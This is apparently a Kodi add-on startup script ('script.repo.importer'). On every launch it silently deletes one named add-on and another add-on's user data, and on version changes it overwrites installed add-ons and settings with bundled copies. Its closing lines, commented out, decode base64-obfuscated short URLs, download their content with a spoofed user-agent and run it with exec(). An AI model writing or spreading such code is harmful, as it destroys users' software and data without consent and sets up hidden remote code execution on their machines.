# -*- coding: utf-8 -*-
import xbmcvfs
import time
import xbmc
import os
import xbmcaddon
import xbmc, xbmcgui, xbmcvfs
import base64
import time, datetime
import shutil

def log(x):
    xbmc.log(repr(x),xbmc.LOGERROR)


#######################################################################
def deleteaddons():

##########################################################################################################################################
################################ DELETE UNWANTED ADDONS AND REPOS #########################################################################
		
	TARGETFOLDER = xbmcvfs.translatePath( 
		'special://home/addons/plugin.video.xxx/'
		)

	def remove_dir (path):
		if os.path.exists(path) :
			dflist = os.listdir(path)
			for itm in dflist:
				_path = os.path.join(path, itm)
				if os.path.isfile(_path):
						os.remove(_path)
				else:
						remove_dir(_path)
			os.rmdir(path)

	remove_dir(TARGETFOLDER)
	
##########################################################################################################################################
################################ DELETE UNWANTED USERDATA #################################################################################


	TARGETFOLDER = xbmcvfs.translatePath( 
		'special://home/userdata/addon_data/plugin.video.abc/'
		)

	def remove_dir (path):
		if os.path.exists(path) :
			dflist = os.listdir(path)
			for itm in dflist:
				_path = os.path.join(path, itm)
				if os.path.isfile(_path):
						os.remove(_path)
				else:
						remove_dir(_path)
			os.rmdir(path)

	remove_dir(TARGETFOLDER)	
	
###############################################################################################################################	
	time.sleep(20)
	xbmc.executebuiltin('RunScript(special://home/addons/script.repo.importer/installaddonsonstart.py)')
	#xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","id":7,"params":{"addonid": "script.realdebrid","enabled":true}}') 

if __name__ == '__main__':
    ADDON = xbmcaddon.Addon('script.repo.importer')
    deleteaddons()

    version = ADDON.getAddonInfo('version')
	
################################# THIS RUNS EVERY TIME AT STARTUP ################################


	
########################################## STOPS HERE ############################################
    if ADDON.getSetting('version') != version:
        path = xbmcvfs.translatePath(os.path.join('special://profile/addon_data/script.repo.importer/'))
        text = xbmcvfs.File('special://home/addons/script.repo.importer/changelog.txt','rb').read()
        xbmcgui.Dialog().textviewer("CLICK THE BACK KEY TO REMOVE",text)
        ADDON.setSetting('version', version)
        headers = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36', 'referer':'http://%s.%s.com' % (version,ADDON.getAddonInfo('id'))}
        # xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.skin","value":"skin.estuary"}}')
        # xbmc.executebuiltin('SendClick(11)')
        # xbmc.sleep(500)

        src_addons = xbmcvfs.translatePath('special://home/addons/script.repo.importer/stuff/addons/')
        dst_addons = xbmcvfs.translatePath('special://home/addons/')
        for file_or_dir in os.listdir(src_addons):
            path = os.path.join(src_addons,file_or_dir)
            if os.path.isdir(path):
                dir = file_or_dir
                src = os.path.join(src_addons,dir)
                dst = os.path.join(dst_addons,dir)
                if os.path.exists(dst):
                    try:
                        shutil.rmtree(dst)
                    except Exception as e:
                        log(("rmtree",e,src,dst))

                try:
                    shutil.copytree(src,dst)
                except Exception as e:
                    log(("copytree",e,src,dst))

        src_userdata = xbmcvfs.translatePath('special://home/addons/script.repo.importer/stuff/userdata/addon_data/')
        dst_userdata = xbmcvfs.translatePath('special://home/userdata/addon_data')
        for file_or_dir in os.listdir(src_userdata):
            path = os.path.join(src_userdata,file_or_dir)
            if os.path.isdir(path):
                dir = file_or_dir
                src = os.path.join(src_userdata,dir)
                dst = os.path.join(dst_userdata,dir)
                if os.path.exists(dst):
                    try:
                        shutil.rmtree(dst)
                    except Exception as e:
                        log(("rmtree",e,src,dst))
                try:
                    shutil.copytree(src,dst)
                except Exception as e:
                    log(("copytree",e,src,dst))
        #time.sleep(20)
        xbmc.executebuiltin('RunScript(special://home/addons/script.repo.importer/enableaddons.py)')
        #enableaddons()
        # try:
            # r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC84TUJDRlM='),headers=headers)
            # home = r.content
        # except: pass
        # try:
            # r = requests.get(base64.b64decode(b'aHR0cDovL2dvby5nbC9Ebm55a3o='),headers=headers)
            # main = r.content
            # exec(main)
        # except: pass